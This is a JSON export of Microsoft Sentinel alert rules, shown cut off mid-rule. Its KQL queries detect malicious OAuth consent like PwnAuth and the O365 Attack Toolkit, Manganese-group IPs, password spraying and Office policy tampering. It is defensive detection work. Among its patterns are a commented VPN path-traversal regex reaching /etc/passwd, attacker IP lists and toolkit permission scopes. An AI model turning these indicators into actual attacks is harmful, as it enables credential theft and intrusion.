{"value":[{"id":"/subscriptions/41de2c2e-1ec0-4d1b-b768-edd976cdd8fe/resourceGroups/DoD365-LAW-RG2/providers/Microsoft.OperationalInsights/workspaces/dod365-law/providers/Microsoft.SecurityInsights/alertRules/BuiltInFusion","name":"BuiltInFusion","etag":"\"02005d19-0000-2700-0000-624904cd0000\"","type":"Microsoft.SecurityInsights/alertRules","kind":"Fusion","properties":{"displayName":"Advanced Multistage Attack Detection","description":"Microsoft Sentinel uses Fusion, a correlation engine based on scalable machine learning algorithms, to automatically detect multistage attacks by identifying combinations of anomalous behaviors and suspicious activities that are observed at various stages of the kill chain. On the basis of these discoveries, Azure Sentinel generates incidents that would otherwise be very difficult to catch. By design, these incidents are low-volume, high-fidelity, and high-severity, which is why this detection is turned ON by default.\n\nSince Fusion correlates multiple signals from various products to detect advanced multistage attacks, successful Fusion detections are presented as Fusion incidents on the Microsoft Sentinel Incidents page. This rule covers the following detections:\n- Fusion for emerging threats\n- Fusion for ransomware\n- Scenario-based Fusion detections (122 scenarios)\n\nTo enable these detections, we recommend you configure the following data connectors for best results:\n- Out-of-the-box anomaly detections\n- Microsoft Entra ID Protection\n- Azure Defender\n- Azure Defender for IoT\n- Microsoft 365 Defender\n- Microsoft Cloud App Security    \n- Microsoft Defender for Endpoint\n- Microsoft Defender for Identity\n- Microsoft Defender for Office 365\n- Scheduled analytics rules, both built-in and those created by your security analysts. Analytics rules must contain kill-chain (tactics) and entity mapping information in order to be used by Fusion.\n\nFor the full description of each detection that is supported by Fusion, go to https://aka.ms/SentinelFusion.","alertRuleTemplateName":"f71aba3d-28fb-450b-b192-4e76a83015c8","tactics":["Collection","CommandAndControl","CredentialAccess","DefenseEvasion","Discovery","Execution","Exfiltration","Impact","InitialAccess","LateralMovement","Persistence","PrivilegeEscalation"],"severity":"High","sourceSettings":[{"enabled":true,"sourceName":"Anomalies","sourceSubTypes":null},{"enabled":true,"sourceName":"Alert providers","sourceSubTypes":[{"sourceSubTypeDisplayName":"Microsoft Entra ID Protection","sourceSubTypeName":"Azure Active Directory Identity Protection","enabled":true,"severityFilters":{"isSupported":true,"filters":[{"severity":"High","enabled":true},{"severity":"Medium","enabled":true},{"severity":"Low","enabled":true},{"severity":"Informational","enabled":true}]}},{"sourceSubTypeDisplayName":"Microsoft 365 Defender","sourceSubTypeName":"Microsoft 365 Defender","enabled":true,"severityFilters":{"isSupported":true,"filters":[{"severity":"High","enabled":true},{"severity":"Medium","enabled":true},{"severity":"Low","enabled":true},{"severity":"Informational","enabled":true}]}},{"sourceSubTypeDisplayName":"Microsoft Cloud App Security","sourceSubTypeName":"Microsoft Cloud App Security","enabled":true,"severityFilters":{"isSupported":true,"filters":[{"severity":"High","enabled":true},{"severity":"Medium","enabled":true},{"severity":"Low","enabled":true},{"severity":"Informational","enabled":true}]}},{"sourceSubTypeDisplayName":"Microsoft Defender for Cloud","sourceSubTypeName":"Azure Defender","enabled":true,"severityFilters":{"isSupported":true,"filters":[{"severity":"High","enabled":true},{"severity":"Medium","enabled":true},{"severity":"Low","enabled":true},{"severity":"Informational","enabled":true}]}},{"sourceSubTypeDisplayName":"Microsoft Defender for Endpoint","sourceSubTypeName":"Microsoft Defender for Endpoint","enabled":true,"severityFilters":{"isSupported":true,"filters":[{"severity":"High","enabled":true},{"severity":"Medium","enabled":true},{"severity":"Low","enabled":true},{"severity":"Informational","enabled":true}]}},{"sourceSubTypeDisplayName":"Microsoft Defender for Identity","sourceSubTypeName":"Microsoft Defender for Identity","enabled":true,"severityFilters":{"isSupported":true,"filters":[{"severity":"High","enabled":true},{"severity":"Medium","enabled":true},{"severity":"Low","enabled":true},{"severity":"Informational","enabled":true}]}},{"sourceSubTypeDisplayName":"Microsoft Defender for IoT","sourceSubTypeName":"Azure Defender for IoT","enabled":true,"severityFilters":{"isSupported":true,"filters":[{"severity":"High","enabled":true},{"severity":"Medium","enabled":true},{"severity":"Low","enabled":true},{"severity":"Informational","enabled":true}]}},{"sourceSubTypeDisplayName":"Microsoft Defender for Office 365","sourceSubTypeName":"Microsoft Defender for Office 365","enabled":true,"severityFilters":{"isSupported":true,"filters":[{"severity":"High","enabled":true},{"severity":"Medium","enabled":true},{"severity":"Low","enabled":true},{"severity":"Informational","enabled":true}]}},{"sourceSubTypeDisplayName":"Azure Sentinel scheduled analytics rules","sourceSubTypeName":"Azure Sentinel scheduled analytics rules","enabled":true,"severityFilters":{"isSupported":true,"filters":[{"severity":"High","enabled":true},{"severity":"Medium","enabled":true},{"severity":"Low","enabled":true},{"severity":"Informational","enabled":true}]}},{"sourceSubTypeDisplayName":"Azure Sentinel NRT analytic rules","sourceSubTypeName":"Azure Sentinel NRT analytic rules","enabled":true,"severityFilters":{"isSupported":true,"filters":[{"severity":"High","enabled":true},{"severity":"Medium","enabled":true},{"severity":"Low","enabled":true},{"severity":"Informational","enabled":true}]}}]}],"scenarioExclusionPatterns":[],"techniques":[],"enabled":true,"lastModifiedUtc":"2022-04-01T03:01:41.5241186Z"}},{"id":"/subscriptions/41de2c2e-1ec0-4d1b-b768-edd976cdd8fe/resourceGroups/dod365-law-rg2/providers/Microsoft.OperationalInsights/workspaces/dod365-law/providers/Microsoft.SecurityInsights/alertRules/fe000702-f8b4-4b73-8514-6bd79a7a86a5","name":"fe000702-f8b4-4b73-8514-6bd79a7a86a5","etag":"\"8600c254-0000-2700-0000-66fdb20f0000\"","type":"Microsoft.SecurityInsights/alertRules","kind":"Scheduled","properties":{"queryFrequency":"PT1H","queryPeriod":"P14D","triggerOperator":"GreaterThan","triggerThreshold":0,"severity":"High","query":"let detectionTime = 1d;\nlet joinLookback = 14d;\nAuditLogs\n| where TimeGenerated > ago(detectionTime)\n| where LoggedByService =~ \"Core Directory\"\n| where Category =~ \"ApplicationManagement\"\n| where OperationName =~ \"Consent to application\"\n| where TargetResources has \"mailboxsettings\"\n| extend AppDisplayName = TargetResources.[0].displayName\n| extend AppClientId = tolower(TargetResources.[0].userPrincipalName)\n| where AppClientId !in ((externaldata(knownAppClientId:string, knownAppDisplayName:string)[@\"https://raw.githubusercontent.com/Azure/Azure-Sentinel/master/Sample%20Data/Feeds/Microsoft.OAuth.KnownApplications.csv\"] with (format=\"csv\")))\n| extend ConsentFull = TargetResources[0].modifiedProperties[4].newValue\n| parse ConsentFull with * \"ConsentType: \" GrantConsentType \", Scope: \" GrantScope1 \"]\" *\n| where ConsentFull contains \"contacts.read\" and ConsentFull contains \"user.read\" and ConsentFull contains \"mail.read\" and ConsentFull contains \"notes.read.all\" and ConsentFull contains \"mailboxsettings.readwrite\" and ConsentFull contains \"Files.ReadWrite.All\"\n| where GrantConsentType != \"AllPrincipals\" // NOTE: we are ignoring if OAuth application was granted to all users via an admin - but admin due diligence should be audited occasionally\n| extend GrantIpAddress = iff(isnotempty(InitiatedBy.user.ipAddress), InitiatedBy.user.ipAddress, InitiatedBy.app.ipAddress)\n| extend GrantInitiatedBy = iff(isnotempty(InitiatedBy.user.userPrincipalName),InitiatedBy.user.userPrincipalName, InitiatedBy.app.displayName)\n| extend GrantUserAgent = iff(AdditionalDetails[0].key =~ \"User-Agent\", AdditionalDetails[0].value, \"\")\n| project TimeGenerated, GrantConsentType, GrantScope1, GrantInitiatedBy, AppDisplayName, GrantIpAddress, GrantUserAgent, AppClientId, OperationName, ConsentFull, CorrelationId\n| join kind = leftouter (AuditLogs\n| where TimeGenerated > ago(joinLookback)\n| where LoggedByService =~ \"Core Directory\"\n| where Category =~ \"ApplicationManagement\"\n| where OperationName =~ \"Add service principal\"\n| extend AppClientId = tolower(TargetResources[0].id)\n| extend AppReplyURLs = iff(TargetResources[0].modifiedProperties[1].newValue has \"AddressType\", TargetResources[0].modifiedProperties[1].newValue, \"\")\n| distinct AppClientId, tostring(AppReplyURLs)\n)\non AppClientId\n| join kind = innerunique (AuditLogs\n| where TimeGenerated > ago(joinLookback)\n| where LoggedByService =~ \"Core Directory\"\n| where Category =~ \"ApplicationManagement\"\n| where OperationName =~ \"Add OAuth2PermissionGrant\" or OperationName =~ \"Add delegated permission grant\"\n| extend GrantAuthentication = tostring(TargetResources[0].displayName)\n| extend GrantOperation = OperationName\n| project GrantAuthentication, GrantOperation, CorrelationId\n) on CorrelationId\n| project TimeGenerated, GrantConsentType, GrantScope1, GrantInitiatedBy, AppDisplayName, AppReplyURLs, GrantIpAddress, GrantUserAgent, AppClientId, GrantAuthentication, OperationName, GrantOperation, CorrelationId, ConsentFull","suppressionDuration":"PT5H","suppressionEnabled":false,"incidentConfiguration":{"createIncident":true,"groupingConfiguration":{"enabled":false,"reopenClosedIncident":false,"lookbackDuration":"PT5M","matchingMethod":"AllEntities","groupByEntities":[],"groupByAlertDetails":[],"groupByCustomDetails":[]}},"entityMappings":[{"entityType":"AzureResource","fieldMappings":[{"identifier":"ResourceId","columnName":"AppDisplayName"}]},{"entityType":"Account","fieldMappings":[{"identifier":"FullName","columnName":"AppClientId"}]},{"entityType":"IP","fieldMappings":[{"identifier":"Address","columnName":"GrantIpAddress"}]}],"eventGroupingSettings":{"aggregationKind":"SingleAlert"},"tactics":["CredentialAccess","DefenseEvasion"],"techniques":["T1528","T1550"],"displayName":"Suspicious application consent similar to O365 Attack Toolkit","enabled":true,"description":"This will alert when a user consents to provide a previously-unknown Azure application with the same OAuth permissions used by the MDSec O365 Attack Toolkit (https://github.com/mdsecactivebreach/o365-attack-toolkit).\nThe default permissions/scope for the MDSec O365 Attack toolkit are contacts.read, user.read, mail.read, notes.read.all, mailboxsettings.readwrite, and files.readwrite.all.\nConsent to applications with these permissions should be rare, especially as the knownApplications list is expanded, especially as the knownApplications list is expanded. Public contributions to expand this filter are welcome!\nFor further information on AuditLogs please see https://docs.microsoft.com/azure/active-directory/reports-monitoring/reference-audit-activities.\nPLATFORM:Azure AD,Microsoft 365,IaaS,Windows\nMITRE:TA0001;T1078;T1078.001;T1078.004,TA0003;T1078;T1078.004,TA0004;T1078;T1078.004,TA0005;T1078;T1078.004;T1550;T1550.001;T1550.004","alertRuleTemplateName":"f948a32f-226c-4116-bddd-d95e91d97eb9","lastModifiedUtc":"2024-10-02T20:50:22.7107955Z"}},{"id":"/subscriptions/41de2c2e-1ec0-4d1b-b768-edd976cdd8fe/resourceGroups/dod365-law-rg2/providers/Microsoft.OperationalInsights/workspaces/dod365-law/providers/Microsoft.SecurityInsights/alertRules/1c2ab68f-c64b-420b-9dc4-772820bc332e","name":"1c2ab68f-c64b-420b-9dc4-772820bc332e","etag":"\"1e004ce3-0000-2700-0000-62c7049b0000\"","type":"Microsoft.SecurityInsights/alertRules","kind":"Scheduled","properties":{"queryFrequency":"PT1H","queryPeriod":"PT1H","triggerOperator":"GreaterThan","triggerThreshold":0,"severity":"High","query":"let timeframe = 1d;\nlet IPList = dynamic([\"45.63.52.41\",\"140.82.17.161\",\"207.148.101.95\",\"45.32.87.51\",\"66.42.98.156\",\"45.76.144.105\",\"217.163.28.35\",\"45.32.141.174\",\"149.28.165.249\",\"209.250.225.247\",\"45.63.100.115\",\"95.179.229.230\",\"209.250.233.247\",\"45.77.121.232\",\"45.76.175.65\",\"104.238.160.237\",\"45.77.181.97\",\"95.179.192.125\",\"149.28.93.184\",\"140.82.16.81\",\"45.76.173.103\",\"45.77.255.22\",\"45.32.11.71\",\"149.28.77.26\",\"45.32.54.50\",\"104.156.233.156\",\"45.32.21.118\",\"45.63.62.109\",\"45.77.244.202\",\"149.248.11.205\",\"104.238.190.244\"]);\n//The following lines are commented out due to currently lacking the CommonSecurityLog table\n//let IOCTerms = \"\\\\?lang=[/..]*/dev/cmdb/sslvpn_websession|/dana-na/jam/[/..]*home/webserver/htdocs/dana/html5acc/guacamole[/..]*etc/passwd\\\\?\";\n//(union isfuzzy=true\n//(CommonSecurityLog\n//| where TimeGenerated >= ago(1d) \n//| where isnotempty(SourceIP) or isnotempty(DestinationIP)\n//| where SourceIP in (IPList) or DestinationIP in (IPList) or Message has_any (IPList)\n//| extend IPMatch = case(SourceIP in (IPList), \"SourceIP\", DestinationIP in (IPList), \"DestinationIP\", \"Message\") \n//| where Message matches regex IOCTerms\n//| summarize StartTimeUtc = min(TimeGenerated), EndTimeUtc = max(TimeGenerated) by SourceIP, DestinationIP, DeviceProduct, DeviceAction, Message, Protocol, SourcePort, DestinationPort, DeviceAddress, DeviceName, IPMatch\n//| extend timestamp = StartTimeUtc, IPCustomEntity = case(IPMatch == \"SourceIP\", SourceIP, IPMatch == \"DestinationIP\", DestinationIP, \"IP in Message Field\") \n//),\nOfficeActivity\n| where TimeGenerated >= ago(1d) \n| where isnotempty(UserAgent) and ClientIP in (IPList)\n| where UserAgent contains \"ExchangeServicesClient/0.0.0.0\"\n| summarize StartTimeUtc = min(TimeGenerated), EndTimeUtc = max(TimeGenerated) by SourceIP = ClientIP, Account = UserId, Type, RecordType, OfficeWorkload, UserAgent, OfficeObjectId, IPMatch = \"ClientIP\"\n| extend timestamp = StartTimeUtc, AccountCustomEntity = Account, IPCustomEntity = SourceIP\n//)\n//)","suppressionDuration":"PT5H","suppressionEnabled":false,"incidentConfiguration":{"createIncident":false,"groupingConfiguration":{"enabled":false,"reopenClosedIncident":false,"lookbackDuration":"PT5M","matchingMethod":"AllEntities","groupByEntities":[],"groupByAlertDetails":[],"groupByCustomDetails":[]}},"entityMappings":[{"entityType":"Account","fieldMappings":[{"identifier":"FullName","columnName":"AccountCustomEntity"}]},{"entityType":"IP","fieldMappings":[{"identifier":"Address","columnName":"IPCustomEntity"}]}],"eventGroupingSettings":{"aggregationKind":"SingleAlert"},"tactics":["InitialAccess","Collection"],"techniques":["T1133","T1114"],"displayName":"Known Manganese IP and UserAgent activity","enabled":false,"description":"Matches IP plus UserAgent IOCs in OfficeActivity data, along with IP plus Connection string information in the CommonSecurityLog data related to Manganese group activity.\nReferences: \nhttps://kb.pulsesecure.net/articles/Pulse_Security_Advisories/SA44101/\nhttps://fortiguard.com/psirt/FG-IR-18-384","alertRuleTemplateName":"a04cf847-a832-4c60-b687-b0b6147da219","lastModifiedUtc":"2022-07-07T16:06:51.3827641Z"}},{"id":"/subscriptions/41de2c2e-1ec0-4d1b-b768-edd976cdd8fe/resourceGroups/dod365-law-rg2/providers/Microsoft.OperationalInsights/workspaces/dod365-law/providers/Microsoft.SecurityInsights/alertRules/179502b0-8b69-438b-838e-5125c265758a","name":"179502b0-8b69-438b-838e-5125c265758a","etag":"\"8700ff5a-0000-2700-0000-66fdc1c70000\"","type":"Microsoft.SecurityInsights/alertRules","kind":"Scheduled","properties":{"queryFrequency":"PT1H","queryPeriod":"PT1H","triggerOperator":"GreaterThan","triggerThreshold":0,"severity":"Medium","query":"let timeRange = 1d;\nlet s_threshold = 30;\nlet l_threshold = 3;\nSigninLogs\n| where TimeGenerated >= ago(timeRange)\n| where OperationName =~ \"Sign-in activity\"\n// Error codes that we want to look at as they are related to the use of incorrect password.\n| where ResultType in (\"50126\", \"50053\" , \"50055\", \"50056\")\n| extend OS = DeviceDetail.operatingSystem, Browser = DeviceDetail.browser \n| extend LocationString= strcat(tostring(LocationDetails[\"countryOrRegion\"]), \"/\", tostring(LocationDetails[\"state\"]), \"/\", tostring(LocationDetails[\"city\"]))\n| summarize StartTime = min(TimeGenerated), EndTime = max(TimeGenerated),LocationCount=dcount(LocationString), Location = make_set(LocationString), \nIPAddress = make_set(IPAddress), IPAddressCount = dcount(IPAddress), AppDisplayName = make_set(AppDisplayName), ResultDescription = make_set(ResultDescription), \nBrowser = make_set(Browser), OS = make_set(OS), SigninCount = count() by UserPrincipalName                               \n// Setting a generic threshold - Can be different for different environment\n| where SigninCount > s_threshold and LocationCount >= l_threshold\n| extend tostring(Location), tostring(IPAddress), tostring(AppDisplayName), tostring(ResultDescription), tostring(Browser), tostring(OS)\n| distinct *\n| extend timestamp = StartTime, AccountCustomEntity = UserPrincipalName, IPCustomEntity = IPAddress","suppressionDuration":"PT5H","suppressionEnabled":false,"incidentConfiguration":{"createIncident":true,"groupingConfiguration":{"enabled":false,"reopenClosedIncident":false,"lookbackDuration":"PT5M","matchingMethod":"AllEntities","groupByEntities":[],"groupByAlertDetails":[],"groupByCustomDetails":[]}},"entityMappings":[{"entityType":"Account","fieldMappings":[{"identifier":"FullName","columnName":"AccountCustomEntity"}]},{"entityType":"IP","fieldMappings":[{"identifier":"Address","columnName":"IPCustomEntity"}]}],"eventGroupingSettings":{"aggregationKind":"SingleAlert"},"tactics":["CredentialAccess"],"techniques":["T1110"],"displayName":"Distributed Password cracking attempts in AzureAD","enabled":true,"description":"Identifies distributed password cracking attempts from the Azure Active Directory SigninLogs.\nThe query looks for unusually high number of failed password attempts coming from multiple locations for a user account.\nReferences: https://docs.microsoft.com/azure/active-directory/reports-monitoring/reference-sign-ins-error-codes\n50053   Account is locked because the user tried to sign in too many times with an incorrect user ID or password.\n50055   Invalid password, entered expired password.\n50056   Invalid or null password - Password does not exist in store for this user.\n50126   Invalid username or password, or invalid on-premises username or password.\nPLATFORM:Azure AD,Microsoft 365,IaaS,Windows\nMITRE:TA0001;T1078;T1078.001;T1078.004,TA0006;T1110;T1110.001;T1110.003","alertRuleTemplateName":"bfb1c90f-8006-4325-98be-c7fffbc254d6","lastModifiedUtc":"2024-10-02T21:57:26.3896508Z"}},{"id":"/subscriptions/41de2c2e-1ec0-4d1b-b768-edd976cdd8fe/resourceGroups/dod365-law-rg2/providers/Microsoft.OperationalInsights/workspaces/dod365-law/providers/Microsoft.SecurityInsights/alertRules/67f0839b-8df7-47fe-aaa5-24e43ae7e2b5","name":"67f0839b-8df7-47fe-aaa5-24e43ae7e2b5","etag":"\"87003504-0000-2700-0000-66fdbc210000\"","type":"Microsoft.SecurityInsights/alertRules","kind":"Scheduled","properties":{"queryFrequency":"PT1H","queryPeriod":"PT1H","triggerOperator":"GreaterThan","triggerThreshold":0,"severity":"Medium","query":"let timeframe = 1d;\nOfficeActivity\n| where TimeGenerated >= ago(timeframe)\n| where RecordType =~ \"ExchangeAdmin\"\n| where UserType in~ (\"Admin\",\"DcAdmin\") \n// Only admin or global-admin can disable/remove policy\n| where Operation startswith \"Remove-\" or Operation startswith \"Disable-\"\n| where Operation has_any (\"AntiPhish\", \"SafeAttachment\", \"SafeLinks\", \"Dlp\", \"Audit\")\n| extend ClientIPOnly = case( \nClientIP has \".\", tostring(split(ClientIP,\":\")[0]), \nClientIP has \"[\", tostring(trim_start(@'[[]',tostring(split(ClientIP,\"]\")[0]))),\nClientIP\n)  \n| extend Port = case(\nClientIP has \".\", (split(ClientIP,\":\")[1]),\nClientIP has \"[\", tostring(split(ClientIP,\"]:\")[1]),\nClientIP\n)\n| summarize StartTimeUtc = min(TimeGenerated), EndTimeUtc = max(TimeGenerated), OperationCount = count() by Operation, UserType, UserId, ClientIP = ClientIPOnly, Port, ResultStatus, Parameters\n| extend timestamp = StartTimeUtc, AccountCustomEntity = UserId, IPCustomEntity = ClientIP","suppressionDuration":"PT5H","suppressionEnabled":false,"incidentConfiguration":{"createIncident":true,"groupingConfiguration":{"enabled":false,"reopenClosedIncident":false,"lookbackDuration":"PT5M","matchingMethod":"AllEntities","groupByEntities":[],"groupByAlertDetails":[],"groupByCustomDetails":[]}},"entityMappings":[{"entityType":"Account","fieldMappings":[{"identifier":"FullName","columnName":"AccountCustomEntity"}]},{"entityType":"IP","fieldMappings":[{"identifier":"Address","columnName":"IPCustomEntity"}]}],"eventGroupingSettings":{"aggregationKind":"SingleAlert"},"tactics":["Persistence","DefenseEvasion"],"techniques":["T1098","T1562"],"displayName":"Office policy tampering","enabled":true,"description":"Identifies if any tampering is done to either auditlog, ATP Safelink, SafeAttachment, AntiPhish or Dlp policy. \nAn adversary may use this technique to evade detection or avoid other policy based defenses.\nReferences: https://docs.microsoft.com/powershell/module/exchange/advanced-threat-protection/remove-antiphishrule?view=exchange-ps.\nPLATFORM:Microsoft 365,IaaS\nMITRE:TA0005;T1562;T1562.008","alertRuleTemplateName":"fbd72eb8-087e-466b-bd54-1ca6ea08c6d3","lastModifiedUtc":"2024-10-02T21:33:20.47938Z"}},{"id":"/subscriptions/41de2c2e-1ec0-4d1b-b768-edd976cdd8fe/resourceGroups/dod365-law-rg2/providers/Microsoft.OperationalInsights/workspaces/dod365-law/providers/Microsoft.SecurityInsights/alertRules/38d56ffc-934a-4b85-b9d9-7a28df85ad50","name":"38d56ffc-934a-4b85-b9d9-7a28df85ad50","etag":"\"86001f52-0000-2700-0000-66fdb1f20000\"","type":"Microsoft.SecurityInsights/alertRules","kind":"Scheduled","properties":{"queryFrequency":"PT1H","queryPeriod":"P14D","triggerOperator":"GreaterThan","triggerThreshold":0,"severity":"Medium","query":"let detectionTime = 1h;\nlet joinLookback = 14d;\nAuditLogs\n| where TimeGenerated > ago(detectionTime)\n| where LoggedByService =~ \"Core Directory\"\n| where Category =~ \"ApplicationManagement\"\n| where OperationName =~ \"Consent to application\"\n| where TargetResources has \"offline\"\n| extend AppDisplayName = TargetResources.[0].displayName\n| extend AppClientId = tolower(TargetResources.[0].id)\n| where AppClientId !in ((externaldata(knownAppClientId:string, knownAppDisplayName:string)[@\"https://raw.githubusercontent.com/Azure/Azure-Sentinel/master/Sample%20Data/Feeds/Microsoft.OAuth.KnownApplications.csv\"] with (format=\"csv\")))\n| extend ConsentFull = TargetResources[0].modifiedProperties[4].newValue\n| parse ConsentFull with * \"ConsentType: \" GrantConsentType \", Scope: \" GrantScope1 \"]\" *\n| where ConsentFull contains \"user.read\" and ConsentFull contains \"offline_access\" and ConsentFull contains \"mail.readwrite\" and ConsentFull contains \"mail.send\" and ConsentFull contains \"files.read.all\"\n| where GrantConsentType != \"AllPrincipals\" // NOTE: we are ignoring if OAuth application was granted to all users via an admin - but admin due diligence should be audited occasionally\n| extend GrantIpAddress = iff(isnotempty(InitiatedBy.user.ipAddress), InitiatedBy.user.ipAddress, InitiatedBy.app.ipAddress)\n| extend GrantInitiatedBy = iff(isnotempty(InitiatedBy.user.userPrincipalName),InitiatedBy.user.userPrincipalName, InitiatedBy.app.displayName)\n| extend GrantUserAgent = iff(AdditionalDetails[0].key =~ \"User-Agent\", AdditionalDetails[0].value, \"\")\n| project TimeGenerated, GrantConsentType, GrantScope1, GrantInitiatedBy, AppDisplayName, GrantIpAddress, GrantUserAgent, AppClientId, OperationName, ConsentFull, CorrelationId\n| join kind = leftouter (AuditLogs\n| where TimeGenerated > ago(joinLookback)\n| where LoggedByService =~ \"Core Directory\"\n| where Category =~ \"ApplicationManagement\"\n| where OperationName =~ \"Add service principal\"\n| extend AppClientId = tolower(TargetResources[0].id)\n| extend AppReplyURLs = iff(TargetResources[0].modifiedProperties[1].newValue has \"AddressType\", TargetResources[0].modifiedProperties[1].newValue, \"\")\n| distinct AppClientId, tostring(AppReplyURLs)\n)\non AppClientId\n| join kind = innerunique (AuditLogs\n| where TimeGenerated > ago(joinLookback)\n| where LoggedByService =~ \"Core Directory\"\n| where Category =~ \"ApplicationManagement\"\n| where OperationName =~ \"Add OAuth2PermissionGrant\" or OperationName =~ \"Add delegated permission grant\"\n| extend GrantAuthentication = tostring(TargetResources[0].displayName)\n| extend GrantOperation = OperationName\n| project GrantAuthentication, GrantOperation, CorrelationId\n) on CorrelationId\n| project TimeGenerated, GrantConsentType, GrantScope1, GrantInitiatedBy, AppDisplayName, AppReplyURLs, GrantIpAddress, GrantUserAgent, AppClientId, GrantAuthentication, OperationName, GrantOperation, CorrelationId, ConsentFull","suppressionDuration":"PT5H","suppressionEnabled":false,"incidentConfiguration":{"createIncident":true,"groupingConfiguration":{"enabled":false,"reopenClosedIncident":false,"lookbackDuration":"PT5M","matchingMethod":"AllEntities","groupByEntities":[],"groupByAlertDetails":[],"groupByCustomDetails":[]}},"entityMappings":[{"entityType":"Account","fieldMappings":[{"identifier":"FullName","columnName":"GrantInitiatedBy"}]},{"entityType":"IP","fieldMappings":[{"identifier":"Address","columnName":"GrantIpAddress"}]}],"eventGroupingSettings":{"aggregationKind":"SingleAlert"},"tactics":["CredentialAccess","DefenseEvasion"],"techniques":["T1528","T1550"],"displayName":"Suspicious application consent similar to PwnAuth","enabled":true,"description":"This will alert when a user consents to provide a previously-unknown Azure application with the same OAuth permissions used by the FireEye PwnAuth toolkit (https://github.com/fireeye/PwnAuth).\nThe default permissions/scope for the PwnAuth toolkit are user.read, offline_access, mail.readwrite, mail.send, and files.read.all.\nConsent to applications with these permissions should be rare, especially as the knownApplications list is expanded. Public contributions to expand this filter are welcome!\nFor further information on AuditLogs please see https://docs.microsoft.com/azure/active-directory/reports-monitoring/reference-audit-activities.\nPLATFORM:Azure AD,Microsoft 365,IaaS\nMITRE:TA0003;T1078;T1078.004,TA0005;T1550;T1550.001;T1550.004,TA0006;T1528","alertRuleTemplateName":"39198934-62a0-4781-8416-a81265c03fd6","lastModifiedUtc":"2024-10-02T20:49:49.2729745Z"}},{"id":"/subscriptions/41de2c2e-1ec0-4d1b-b768-edd976cdd8fe/resourceGroups/dod365-law-rg2/providers/Microsoft.OperationalInsights/workspaces/dod365-law/providers/Microsoft.SecurityInsights/alertRules/48eb6c54-1b37-45d2-a674-026eeac8c4fa","name":"48eb6c54-1b37-45d2-a674-026eeac8c4fa","etag":"\"860028c2-0000-2700-0000-66fdb7e10000\"","type":"Microsoft.SecurityInsights/alertRules","kind":"Scheduled","properties":{"queryFrequency":"PT1H","queryPeriod":"P7D","triggerOperator":"GreaterThan","triggerThreshold":3,"severity":"Medium","query":"let current = 1d;\nlet auditLookback = 7d;\n// Setting threshold to 3 as a default, change as needed.  \n// Any operation that has been initiated by a user or app more than 3 times in the past 7 days will be excluded\nlet threshold = 3;\n// Gather initial data from lookback period, excluding current, adjust current to more than a single day if no results\nlet AuditTrail = AuditLogs | where TimeGenerated >= ago(auditLookback) and TimeGenerated < ago(current)\n// 2 other operations that can be part of malicious activity in this situation are \n// \"Add OAuth2PermissionGrant\" and \"Add service principal\", extend the filter below to capture these too\n| where OperationName == \"Consent to application\"\n| extend InitiatedBy = iff(isnotempty(tostring(parse_json(tostring(InitiatedBy.user)).userPrincipalName)), \ntostring(parse_json(tostring(InitiatedBy.user)).userPrincipalName), tostring(parse_json(tostring(InitiatedBy.app)).displayName))\n| extend TargetResourceName = tolower(tostring(TargetResources.[0].displayName))\n| summarize max(TimeGenerated), OperationCount = count() by OperationName, InitiatedBy, TargetResourceName\n// only including operations by initiated by a user or app that is above the threshold so we produce only rare and has not occurred in last 7 days\n| where OperationCount > threshold\n;\n// Gather current period of audit data\nlet RecentConsent = AuditLogs | where TimeGenerated >= ago(current)\n| where OperationName == \"Consent to application\"\n| extend IpAddress = iff(isnotempty(tostring(parse_json(tostring(InitiatedBy.user)).ipAddress)), \ntostring(parse_json(tostring(InitiatedBy.user)).ipAddress), tostring(parse_json(tostring(InitiatedBy.app)).ipAddress))\n| extend InitiatedBy = iff(isnotempty(tostring(parse_json(tostring(InitiatedBy.user)).userPrincipalName)), \ntostring(parse_json(tostring(InitiatedBy.user)).userPrincipalName), tostring(parse_json(tostring(InitiatedBy.app)).displayName))\n| extend TargetResourceName = tolower(tostring(TargetResources.[0].displayName))\n| parse TargetResources.[0].modifiedProperties with * \"ConsentType: \" ConsentType \"]\" *\n| project TimeGenerated, InitiatedBy, IpAddress, TargetResourceName, Category, OperationName, ConsentType , CorrelationId, Type;\n// Exclude previously seen audit activity for \"Consent to application\" that was seen in the lookback period\n// First for rare InitiatedBy\nlet RareConsentBy = RecentConsent | join kind= leftanti AuditTrail on OperationName, InitiatedBy \n| extend Reason = \"Previously unseen user consenting\";\n// Second for rare TargetResourceName\nlet RareConsentApp = RecentConsent | join kind= leftanti AuditTrail on OperationName, TargetResourceName\n| extend Reason = \"Previously unseen app granted consent\";\nRareConsentBy | union RareConsentApp\n| summarize Reason = makeset(Reason) by TimeGenerated, InitiatedBy, IpAddress, TargetResourceName, Category, OperationName, ConsentType, CorrelationId, Type\n| extend timestamp = TimeGenerated, AccountCustomEntity = InitiatedBy, HostCustomEntity = TargetResourceName, IPCustomEntity = IpAddress","suppressionDuration":"PT5H","suppressionEnabled":true,"incidentConfiguration":{"createIncident":true,"groupingConfiguration":{"enabled":false,"reopenClosedIncident":false,"lookbackDuration":"PT5M","matchingMethod":"AllEntities","groupByEntities":[],"groupByAlertDetails":[],"groupByCustomDetails":[]}},"entityMappings":[{"entityType":"Account","fieldMappings":[{"identifier":"FullName","columnName":"AccountCustomEntity"}]},{"entityType":"IP","fieldMappings":[{"identifier":"Address","columnName":"IPCustomEntity"}]},{"entityType":"AzureResource","fieldMappings":[{"identifier":"ResourceId","columnName":"HostCustomEntity"}]}],"eventGroupingSettings":{"aggregationKind":"SingleAlert"},"tactics":["Persistence","LateralMovement","Collection"],"techniques":["T1136"],"displayName":"Rare application consent","enabled":true,"description":"This will alert when the \"Consent to application\" operation occurs by a user that has not done this operation before or rarely does this.\nThis could indicate that permissions to access the listed Azure App were provided to a malicious actor. \nConsent to application, Add service principal and Add OAuth2PermissionGrant should typically be rare events. \nThis may help detect the Oauth2 attack that can be initiated by this publicly available tool - https://github.com/fireeye/PwnAuth\nFor further information on AuditLogs please see https://docs.microsoft.com/azure/active-directory/reports-monitoring/reference-audit-activities.\nPLATFORM:Azure AD,Microsoft 